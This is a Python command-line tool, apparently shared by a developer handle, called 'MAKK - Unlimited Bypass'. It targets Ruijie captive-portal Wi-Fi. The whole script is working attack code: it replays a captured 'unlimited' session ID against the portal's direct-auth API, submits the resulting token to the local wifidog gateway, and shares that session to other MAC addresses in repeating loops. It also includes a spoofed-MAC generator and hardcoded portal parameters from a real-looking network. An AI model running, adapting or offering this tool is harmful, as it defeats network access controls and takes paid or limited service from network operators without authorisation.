#!/usr/bin/env python3
"""
MAKK - Unlimited Bypass (Auto Reconnect + Multi-Device + URL Switcher)
Session URL ကို ပြောင်းသုံးလို့ရ
Developer: @makxcross_admin
Version: 22.0
"""

import re
import requests
import os
import sys
import time
import random
import urllib3
import json
import socket
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== COLORS ====================
G = "\033[1;32m"
Y = "\033[1;33m"
R = "\033[1;31m"
W = "\033[0m"
C = "\033[1;36m"
M = "\033[1;35m"
B = "\033[1;34m"

# ==================== LOGO ====================
def logo():
    print(f"{M}" + "="*60)
    print(f"{M}  ███╗   ███╗ █████╗ ██╗  ██╗██╗  ██╗")
    print(f"{M}  ████╗ ████║██╔══██╗██║ ██╔╝██║ ██╔╝")
    print(f"{M}  ██╔████╔██║███████║█████╔╝ █████╔╝ ")
    print(f"{M}  ██║╚██╔╝██║██╔══██║██╔═██╗ ██╔═██╗ ")
    print(f"{M}  ██║ ╚═╝ ██║██║  ██║██║  ██╗██║  ██╗")
    print(f"{M}  ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝")
    print(f"{M}" + "="*60)
    print(f"{C}          MAKK - Unlimited Bypass Tool")
    print(f"{Y}       Developer: @makxcross_admin")
    print(f"{Y}       URL Switcher + Multi-Device")
    print(f"{M}" + "="*60 + f"{W}")

# ==================== CONFIG ====================
CONFIG_FILE = "makk_url_switch.json"
BASE_URL = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=4c49684b3507&gw_sn=H1U82VB009706&gw_address=192.168.110.1&gw_port=2060&ip=192.168.109.206&mac=0c:c6:fd:4b:5f:36&slot_num=16&nasip=192.168.1.247&ssid=VLAN233&ustate=0&mac_req=0&url=http%3A%2F%2Fconnectivitycheck%2Egstatic%2Ecom%2Fgenerate%5F204&chap_id=%5C267&chap_challenge=%5C117%5C357%5C330%5C210%5C102%5C206%5C267%5C204%5C315%5C377%5C142%5C317%5C376%5C266%5C273%5C033"

# ==================== GLOBALS ====================
running = False
loop_count = 0
bypass_active = False
unlimited_session = ""
session_url = ""
target_gateway = ""
device_list = []
mode = "gaming"
reconnect_count = 0

# ==================== CONFIG FUNCTIONS ====================
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {}

def save_config():
    config = {
        "unlimited_session": unlimited_session,
        "session_url": session_url,
        "target_gateway": target_gateway,
        "device_list": device_list,
        "mode": mode
    }
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

# ==================== URL FUNCTIONS ====================
def extract_mac_from_url(url):
    mac_match = re.search(r'mac=([^&]+)', url)
    if mac_match:
        return mac_match.group(1)
    return None

def extract_gateway_from_url(url):
    gw_match = re.search(r'gw_address=([^&]+)', url)
    if gw_match:
        return gw_match.group(1)
    return None

def extract_session_from_url(url):
    sid_match = re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', url)
    if sid_match:
        return sid_match.group(1)
    return None

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

def generate_random_mac():
    bytes_ = [random.randint(0, 255) for _ in range(6)]
    bytes_[0] = bytes_[0] & 0xFC | 0x02
    return ':'.join(f'{b:02x}' for b in bytes_)

def validate_mac(mac):
    pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
    return re.match(pattern, mac) is not None

def format_mac(mac):
    mac = mac.upper().strip()
    mac = re.sub(r'[^0-9A-Fa-f]', '', mac)
    if len(mac) == 12:
        return ':'.join(mac[i:i+2] for i in range(0, 12, 2))
    return mac

def is_valid_session(session):
    if not session:
        return False
    return bool(re.match(r'^[a-zA-Z0-9]+$', session))

# ==================== CORE FUNCTIONS ====================
def get_session_id(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        response = requests.get(session_url, headers=headers, timeout=10, allow_redirects=True)
        session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response.url)
        if session_id:
            return session_id.group(1)
    except:
        pass
    return None

def OneClick(session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': BASE_URL,
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        'x-requested-with': 'XMLHttpRequest'
    }
    params = {'lang': 'en_US'}
    json_data = {'phoneNumber': '', 'sessionId': session_id}
    
    try:
        response = requests.post(
            f'{BASE_URL}/api/auth/direct/',
            params=params,
            headers=headers,
            json=json_data,
            timeout=15
        )
        res_text = response.text
        
        if 'token' in res_text or 'success' in res_text:
            token_match = re.search('token=(.*?)&', res_text)
            if token_match:
                return token_match.group(1)
            
            try:
                res_json = response.json()
                if res_json.get('token'):
                    return res_json.get('token')
                if res_json.get('success') == True:
                    return session_id
            except:
                pass
    except:
        pass
    return None

def auth_gateway(token, gateway_ip):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
    }
    params = {'token': token, 'phoneNumber': ''}
    
    ports = [2060, 80, 8080]
    for port in ports:
        try:
            response = requests.get(f'http://{gateway_ip}:{port}/wifidog/auth', params=params, headers=headers, timeout=10, allow_redirects=True)
            if "success" in response.url or 'www.baidu.com' in response.url:
                return True
        except:
            continue
    return False

def check_internet():
    try:
        response = requests.get("http://www.google.com", timeout=3)
        return response.status_code == 200
    except:
        try:
            response = requests.get("http://8.8.8.8", timeout=3)
            return response.status_code == 200
        except:
            return False

def generate_share_url(mac):
    """Generate shareable URL for a device"""
    if not session_url:
        return None
    share_url = replace_mac(session_url, mac)
    return share_url

def share_to_device(mac):
    """Share unlimited session to a specific MAC"""
    global unlimited_session, session_url, target_gateway
    
    if not unlimited_session:
        return False, "No unlimited session"
    
    if not is_valid_session(unlimited_session):
        return False, "Invalid session"
    
    # Generate URL for this MAC
    share_url = generate_share_url(mac)
    if share_url:
        print(f"  🔗 URL: {share_url[:60]}...")
    
    # Try OneClick with the session
    token = OneClick(unlimited_session)
    if not token:
        return False, "OneClick failed"
    
    # Auth gateway
    if auth_gateway(token, target_gateway):
        return True, f"Connected: {mac}"
    
    return False, "Auth failed"

def do_bypass():
    """Main bypass - use unlimited session"""
    global unlimited_session, target_gateway
    
    if not unlimited_session:
        return False, "No session"
    
    # Try OneClick
    token = OneClick(unlimited_session)
    if not token:
        return False, "OneClick failed"
    
    # Auth gateway
    if auth_gateway(token, target_gateway):
        return True, "Connected!"
    
    return False, "Auth failed"

# ==================== AUTO LOOP ====================
def auto_loop():
    global running, loop_count, bypass_active, reconnect_count
    
    running = True
    loop_count = 0
    bypass_active = False
    reconnect_count = 0
    
    intervals = {"kill": 15, "gaming": 180, "stable": 420}
    interval = intervals.get(mode, 180)
    
    mode_names = {
        "kill": f"{R}💀 KILL Mode (15s){W}",
        "gaming": f"{B}🎮 GAMING Mode (3min){W}",
        "stable": f"{G}⭐ STABLE Mode (7min){W}"
    }
    
    print(f"\n{C}{'='*60}{W}")
    print(f"  🔄 {mode_names.get(mode, 'GAMING Mode')}")
    print(f"  ⏱️  Interval: {interval} seconds")
    print(f"  🔒 Session: {unlimited_session[:16] if unlimited_session else 'None'}...")
    print(f"  📱 Devices: {len(device_list)}")
    print(f"  ⏹️  Press Ctrl+C to stop")
    print(f"{C}{'='*60}{W}")
    
    try:
        while running:
            loop_count += 1
            
            print(f"\n{C}{'='*60}{W}")
            print(f"  🔄 Loop #{loop_count} - {time.strftime('%H:%M:%S')}")
            print(f"{C}{'='*60}{W}")
            
            # First, do bypass for current device
            success, msg = do_bypass()
            if success:
                print(f"  📱 {G}✅ Self: {msg}{W}")
                bypass_active = True
                reconnect_count = 0
            else:
                print(f"  📱 {R}❌ Self: {msg}{W}")
                bypass_active = False
                reconnect_count += 1
            
            # Then share to all devices
            if device_list:
                print(f"\n  {C}📱 Sharing to {len(device_list)} devices...{W}")
                for i, mac in enumerate(device_list):
                    print(f"  [{i+1}] {mac}")
                    success, msg = share_to_device(mac)
                    if success:
                        print(f"      {G}✅ {msg}{W}")
                    else:
                        print(f"      {R}❌ {msg}{W}")
                    time.sleep(0.5)
            
            # Check internet
            internet_ok = check_internet()
            if internet_ok:
                print(f"\n  {G}✅ Internet Working{W}")
            else:
                print(f"\n  {R}❌ No Internet{W}")
                if reconnect_count > 2:
                    print(f"  {Y}💡 Reconnecting... (Attempt {reconnect_count}){W}")
            
            # Countdown
            print(f"\n  ⏳ Waiting {interval} seconds...")
            for i in range(interval, 0, -5):
                if not running:
                    break
                status = "🌐 Online" if check_internet() else "📴 Offline"
                print(f"  ⏱️  {i}s remaining | {status}", end="\r")
                time.sleep(5)
            print("  " + " " * 40 + "\r", end="")
            
    except KeyboardInterrupt:
        print(f"\n\n  {Y}🛑 Stopped by user{W}")
    finally:
        running = False
        bypass_active = False
        print(f"\n  {Y}🔓 Released{W}")
        print(f"  {C}📊 Total loops: {loop_count}{W}")
        print(f"  {C}📊 Reconnects: {reconnect_count}{W}")

# ==================== UI ====================
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    logo()

def show_menu():
    print(f"\n{Y}{'='*60}{W}")
    print(f"{Y}[ MODE SELECTION ]{W}")
    print(f"  {G}[1]{W} 💀 Kill Mode (15s)")
    print(f"  {B}[2]{W} 🎮 Gaming Mode (3min)")
    print(f"  {G}[3]{W} ⭐ Stable Mode (7min)")
    print(f"  {Y}[4]{W} 🔄 Change Settings")
    print(f"  {Y}[5]{W} 📱 Manage Devices")
    print(f"  {Y}[6]{W} 📋 Show Share URLs")
    print(f"  {R}[7]{W} 🚪 Exit")
    print(f"{Y}{'='*60}{W}")

# ==================== MAIN ====================
def main():
    global unlimited_session, session_url, target_gateway, device_list, mode, bypass_active
    
    clear_screen()
    banner()
    
    config = load_config()
    unlimited_session = config.get("unlimited_session", "")
    session_url = config.get("session_url", "")
    target_gateway = config.get("target_gateway", "")
    device_list = config.get("device_list", [])
    mode = config.get("mode", "gaming")
    
    print(f"\n{C}[ Current Settings ]{W}")
    print(f"  🔒 Session: {G}{unlimited_session[:16] if unlimited_session else 'Not set'}...{W}")
    print(f"  🔗 URL: {G}{session_url[:50] if session_url else 'Not set'}...{W}")
    print(f"  📱 Devices: {G}{len(device_list)}{W}")
    print(f"  📌 Mode: {G}{mode}{W}")
    print(f"  🔓 Status: {G}Active{W}" if bypass_active else f"  🔓 Status: {R}Inactive{W}")
    print("="*60)
    
    if not unlimited_session:
        print(f"\n{Y}[!] Please configure unlimited session.{W}")
        print(f"  {C}💡 Enter your Unlimited Session ID or URL{W}")
        
        choice = input(f"\n{G}Session ID or URL: {W}").strip()
        
        if choice:
            extracted = extract_session_from_url(choice)
            if extracted and is_valid_session(extracted):
                unlimited_session = extracted
            elif is_valid_session(choice):
                unlimited_session = choice
            else:
                session_id = get_session_id(choice)
                if session_id and is_valid_session(session_id):
                    unlimited_session = session_id
            
            if unlimited_session:
                print(f"{G}[+] Session: {unlimited_session}{W}")
                if not session_url:
                    session_url = choice
                if not target_gateway:
                    target_gateway = extract_gateway_from_url(choice) or "192.168.28.1"
                save_config()
    
    # If no URL but have session, ask for URL
    if unlimited_session and not session_url:
        print(f"\n{Y}[!] Enter your Session URL (with MAC):{W}")
        print(f"  {C}💡 This URL will be used to generate share links{W}")
        session_url = input(f"{G}Session URL: {W}").strip()
        if session_url:
            if not target_gateway:
                target_gateway = extract_gateway_from_url(session_url) or "192.168.28.1"
            save_config()
    
    while True:
        clear_screen()
        banner()
        
        print(f"\n{C}[ Current Settings ]{W}")
        print(f"  🔒 Session: {G}{unlimited_session[:16] if unlimited_session else 'None'}...{W}")
        print(f"  🔗 URL: {G}{session_url[:50] if session_url else 'None'}...{W}")
        print(f"  📱 Devices: {G}{len(device_list)}{W}")
        print(f"  📌 Mode: {G}{mode}{W}")
        print(f"  🔓 Status: {G}Active{W}" if bypass_active else f"  🔓 Status: {R}Inactive{W}")
        print("="*60)
        
        show_menu()
        
        choice = input(f"\n{G}Select option (1-7): {W}").strip()
        
        if choice == "1":
            if not unlimited_session:
                print(f"{R}❌ No session!{W}")
                time.sleep(2)
                continue
            mode = "kill"
            save_config()
            auto_loop()
            input(f"\n{G}Press Enter to continue...{W}")
        elif choice == "2":
            if not unlimited_session:
                print(f"{R}❌ No session!{W}")
                time.sleep(2)
                continue
            mode = "gaming"
            save_config()
            auto_loop()
            input(f"\n{G}Press Enter to continue...{W}")
        elif choice == "3":
            if not unlimited_session:
                print(f"{R}❌ No session!{W}")
                time.sleep(2)
                continue
            mode = "stable"
            save_config()
            auto_loop()
            input(f"\n{G}Press Enter to continue...{W}")
        elif choice == "4":
            clear_screen()
            banner()
            print(f"\n{Y}[ Change Settings ]{W}")
            print("="*60)
            
            print(f"{C}Current Session: {unlimited_session}{W}")
            new_session = input(f"{G}New Session ID or URL: {W}").strip()
            if new_session:
                extracted = extract_session_from_url(new_session)
                if extracted and is_valid_session(extracted):
                    unlimited_session = extracted
                elif is_valid_session(new_session):
                    unlimited_session = new_session
                else:
                    session_id = get_session_id(new_session)
                    if session_id and is_valid_session(session_id):
                        unlimited_session = session_id
                
                if unlimited_session:
                    print(f"{G}[+] Session updated: {unlimited_session}{W}")
            
            new_url = input(f"{G}Session URL (for share links): {W}").strip()
            if new_url:
                session_url = new_url
                if not target_gateway:
                    target_gateway = extract_gateway_from_url(session_url) or "192.168.28.1"
                print(f"{G}[+] URL updated{W}")
            
            target_gateway = input(f"{G}Gateway IP: {W}").strip() or target_gateway
            save_config()
            print(f"{G}[✓] Settings saved!{W}")
            time.sleep(1)
        elif choice == "5":
            clear_screen()
            banner()
            print(f"\n{Y}[ Manage Devices ]{W}")
            print("="*60)
            
            if device_list:
                print(f"{C}Current Devices:{W}")
                for i, mac in enumerate(device_list):
                    print(f"  {i+1}. {mac}")
                print("="*60)
            
            print(f"  {G}[1]{W} Add Device")
            print(f"  {G}[2]{W} Remove Device")
            print(f"  {G}[3]{W} Clear All")
            print(f"  {G}[4]{W} Back")
            
            sub = input(f"\n{G}Select: {W}").strip()
            
            if sub == "1":
                mac = input(f"{G}MAC Address: {W}").strip()
                mac = format_mac(mac)
                if validate_mac(mac):
                    if mac not in device_list:
                        device_list.append(mac)
                        save_config()
                        print(f"{G}[+] Added: {mac}{W}")
                    else:
                        print(f"{Y}[!] Already exists{W}")
                else:
                    print(f"{R}[-] Invalid MAC{W}")
                time.sleep(1)
            elif sub == "2":
                if device_list:
                    for i, mac in enumerate(device_list):
                        print(f"  {i+1}. {mac}")
                    try:
                        idx = int(input(f"{G}Number to remove: {W}")) - 1
                        if 0 <= idx < len(device_list):
                            removed = device_list.pop(idx)
                            save_config()
                            print(f"{G}[+] Removed: {removed}{W}")
                        else:
                            print(f"{R}[-] Invalid number{W}")
                    except:
                        print(f"{R}[-] Invalid input{W}")
                else:
                    print(f"{Y}No devices{W}")
                time.sleep(1)
            elif sub == "3":
                device_list = []
                save_config()
                print(f"{G}[✓] All devices cleared{W}")
                time.sleep(1)
        elif choice == "6":
            clear_screen()
            banner()
            print(f"\n{Y}[ Share URLs ]{W}")
            print("="*60)
            
            if not session_url:
                print(f"  {R}❌ No session URL set!{W}")
                print(f"  {Y}💡 Go to Change Settings to set URL{W}")
            elif device_list:
                for mac in device_list:
                    share_url = generate_share_url(mac)
                    print(f"  {G}MAC: {mac}{W}")
                    print(f"  🔗 {C}{share_url}{W}")
                    print()
            else:
                print(f"  {Y}No devices added{W}")
            
            input(f"\n{G}Press Enter to continue...{W}")
        elif choice == "7":
            if bypass_active:
                print(f"{Y}🔓 Releasing...{W}")
                bypass_active = False
                time.sleep(1)
            print(f"\n{C}Good Bye!{W}")
            break
        else:
            print(f"{R}[✗] Invalid choice.{W}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{C}Exiting...{W}")
        if bypass_active:
            print(f"{Y}🔓 Released{W}")
    except Exception as e:
        print(f"\n{R}Error: {e}{W}")